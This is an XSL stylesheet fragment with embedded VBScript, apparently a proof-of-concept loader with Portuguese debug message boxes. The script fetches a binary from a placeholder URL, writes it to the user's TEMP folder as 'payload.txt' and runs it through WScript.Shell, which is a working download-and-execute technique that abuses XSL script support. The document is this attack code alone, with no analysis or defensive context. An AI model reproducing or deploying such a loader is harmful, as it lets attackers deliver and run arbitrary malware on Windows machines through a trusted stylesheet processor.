<ms:script language="VBScript" implements-prefix="user">
  <![CDATA[
    Function main()
      Dim objShell
      Dim objHTTP
      Dim objStream
      Dim strURL
      Dim strFilePath
      Dim strTempDir

      strURL = "http://example.com/test_binary.exe"

      Set objShell = CreateObject("WScript.Shell" )
      strTempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
      MsgBox "Diretório TEMP: " & strTempDir, vbInformation, "Depuração XSL"

      strFilePath = strTempDir & "\payload.txt"
      MsgBox "Caminho do arquivo: " & strFilePath, vbInformation, "Depuração XSL"

      Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
      objHTTP.open "GET", strURL, False
      objHTTP.send
      MsgBox "Download concluído. Status: " & objHTTP.status, vbInformation, "Depuração XSL"

      If objHTTP.status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Open
        objStream.Type = 1
        objStream.Write objHTTP.responseBody
        objStream.SaveToFile strFilePath, 2
        objStream.Close
        MsgBox "Binário salvo em: " & strFilePath, vbInformation, "Depuração XSL"

        objShell.Run strFilePath, 1, True
        MsgBox "Execução do binário iniciada.", vbInformation, "Depuração XSL"
      Else
        MsgBox "Erro no download. Status HTTP: " & objHTTP.status, vbCritical, "Depuração XSL"
      End If

      Set objShell = Nothing
      Set objHTTP = Nothing
      Set objStream = Nothing
    End Function
  ]]>
</ms:script>
